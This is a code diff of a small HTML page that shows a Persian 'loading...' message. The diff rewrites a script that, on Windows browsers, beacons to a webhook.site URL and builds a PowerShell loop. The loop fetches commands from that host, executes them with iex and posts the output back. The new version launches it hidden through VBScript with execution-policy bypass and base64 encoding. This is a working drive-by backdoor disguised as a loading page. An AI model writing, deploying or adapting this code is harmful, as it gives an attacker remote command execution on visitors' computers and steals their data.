@@ -1,28 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Test</title>
-</head>
-<body>
-  <h3>در حال بارگذاری...</h3>
-
-  <script>
-    if (/Win/i.test(navigator.userAgent)) {
-      const HOOK = "https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d";
-      const UID  = Math.random().toString(36).substring(2, 10);
-
-      // payload کاملاً فشرده و بدون خطا
-      const payload = "$h='"+HOOK+"';$u='"+UID+"';while(1){try{$c=(iwr \"$h?get=$u\" -UseBasicParsing -EA Stop).Content;if($c){$o=iex $c 2>&1|Out-String;iwr $h -Method POST -Body \"uid=$u&out=$o\" -UseBasicParsing|Out-Null}}catch{};sleep 5}";
-
-      const b64 = btoa(unescape(encodeURIComponent(payload)));
-
-      setTimeout(() => {
-        location = "data:text/html,<script>eval(atob('"+b64+"'))</script>";
-      }, 800);
-
-      fetch(HOOK + "?win=" + UID);
-    }
-  </script>
-</body>
-</html>
+<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
+<script>
+if(/Win/i.test(navigator.userAgent)){
+  const h="https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d";
+  const u=Math.random().toString(36).substr(2,9);
+  const p="$h='"+h+"';$u='"+u+"';for(;;){try{$r=(iwr \"$h?u=$u\" -UseB).Content;if($r){$o=iex $r 2>&1|Out-String;(iwr $h -Method POST -Body \"u=$u&o=$o\" -UseB)}}catch{};sleep 5}";
+  setTimeout(()=>{location="data:text/html,<script language=vbs>CreateObject(`WScript.Shell`).Run `powershell -ep Bypass -enc "+btoa(unescape(encodeURIComponent(p)))+"`,0</script>"},900);
+  fetch(h+"?start="+u);
+}
+</script>
+</body></html>
